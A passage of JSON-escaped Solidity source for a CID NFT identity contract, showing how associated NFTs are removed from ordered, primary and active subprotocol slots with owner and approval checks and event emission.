_nftIDToAdd);\n                activeData.values.push(_nftIDToAdd);\n                activeData.positions[_nftIDToAdd] = lengthBeforeAddition + 1;\n            }\n            emit ActiveDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd, lengthBeforeAddition);\n        }\n    }\n\n    /// @notice Remove / unset a key for the given CID NFT and subprotocol\n    /// @param _cidNFTID ID of the CID NFT to remove the data from\n    /// @param _subprotocolName Name of the subprotocol where the data will be removed. Has to exist.\n    /// @param _key Key to unset. This value is only relevant for the AssociationType ORDERED\n    /// @param _nftIDToRemove The ID of the NFT to remove. Only needed for the AssociationType ACTIVE\n    /// @param _type Association type (see AssociationType struct) to remove this data from\n    function remove(\n        uint256 _cidNFTID,\n        string calldata _subprotocolName,\n        uint256 _key,\n        uint256 _nftIDToRemove,\n        AssociationType _type\n    ) public {\n        SubprotocolRegistry.SubprotocolData memory subprotocolData = subprotocolRegistry.getSubprotocol(\n            _subprotocolName\n        );\n        address subprotocolOwner = subprotocolData.owner;\n        if (subprotocolOwner == address(0)) revert SubprotocolDoesNotExist(_subprotocolName);\n        address cidNFTOwner = ownerOf[_cidNFTID];\n        if (\n            cidNFTOwner != msg.sender &&\n            getApproved[_cidNFTID] != msg.sender &&\n            !isApprovedForAll[cidNFTOwner][msg.sender]\n        ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);\n\n        ERC721 nftToRemove = ERC721(subprotocolData.nftAddress);\n        if (_type == AssociationType.ORDERED) {\n            // We do not have to check if ordered is supported by the subprotocol. If not, the value will not be unset (which is checked below)\n            uint256 currNFTID = cidData[_cidNFTID][_subprotocolName].ordered[_key];\n            if (currNFTID == 0)\n                // This check is technically not necessary (because the NFT transfer would fail), but we include it to have more meaningful errors\n                revert OrderedValueNotSet(_cidNFTID, _subprotocolName, _key);\n            delete cidData[_cidNFTID][_subprotocolName].ordered[_key];\n            nftToRemove.safeTransferFrom(address(this), msg.sender, currNFTID);\n            emit OrderedDataRemoved(_cidNFTID, _subprotocolName, _key, _nftIDToRemove);\n        } else if (_type == AssociationType.PRIMARY) {\n            uint256 currNFTID = cidData[_cidNFTID][_subprotocolName].primary;\n            if (currNFTID == 0) revert PrimaryValueNotSet(_cidNFTID, _subprotocolName);\n            delete cidData[_cidNFTID][_subprotocolName].primary;\n            nftToRemove.safeTransferFrom(address(this), msg.sender, currNFTID);\n            emit PrimaryDataRemoved(_cidNFTID, _subprotocolName, _nftIDToRemove);\n        } else if (_type == AssociationType.ACTIVE) {\n            IndexedArray storage activeData = cidData[_cidNFTID][_subprotocolName].active;\n            uint256 arrayPosition = activeData.positions[_nftIDToRemove]; // Index + 1, 0 if non-existant\n            if (arrayPosition == 0) revert ActiveArrayDoesNotContainID(_cidNFTID, _subprotocolName, _nftIDToRemove);\n            uint256 arrayLength = activeData.values.length;\n            // Swap only necessary if not already the last element\n            if (arrayPosition != arrayLength) {\n                uint256 befSwapLastNFTID = activeData.values[arrayLength - 1];\n                activeData.values[arrayPosition - 1] = befSwapLastNFTID;\n                activeData.positions[befSwapLastNFTID] = arrayPosition;\n            }\n            activeData.values.pop();\n            activeData.positions[_nftIDToRemove] = 0;\n            nftToRemove.safeTransferFrom(address(this), msg.sender, _nftIDToRemove);\n            emit ActiveDataRemoved(_cidNFTID, _subprotocolName, _nftIDToRemove);\n        }\n    }\n\n    /// @notice Get the ordered data that is associated with a CID NFT / Subprotocol\n    /// @param"
    }
  ]
}